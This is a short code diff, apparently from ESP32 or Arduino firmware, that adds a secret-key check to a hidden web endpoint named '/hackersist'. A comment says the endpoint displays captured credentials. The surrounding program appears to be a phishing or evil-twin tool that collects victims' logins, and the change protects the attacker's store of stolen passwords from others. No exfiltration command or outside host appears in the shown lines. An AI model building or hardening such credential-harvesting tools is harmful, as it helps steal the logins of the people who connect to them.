@@ -4860,6 +4860,15 @@ void setup() {
 
     // Display captured credentials (hidden page)
     server.on("/hackersist", HTTP_GET, [](AsyncWebServerRequest *request){
+        if (!request->hasParam("key")) {
+            request->send(403, "text/html", "<h2>Access Denied</h2>");
+            return;
+        }
+        String key = request->getParam("key")->value();
+        if (key != secretKey) {
+            request->send(403, "text/html", "<h2>Invalid Key</h2>");
+            return;
+        }
         if (capturedCredentials.length() == 0) {
             request->send(200, "text/html", "<h2>No credentials found.</h2>");
         } else {
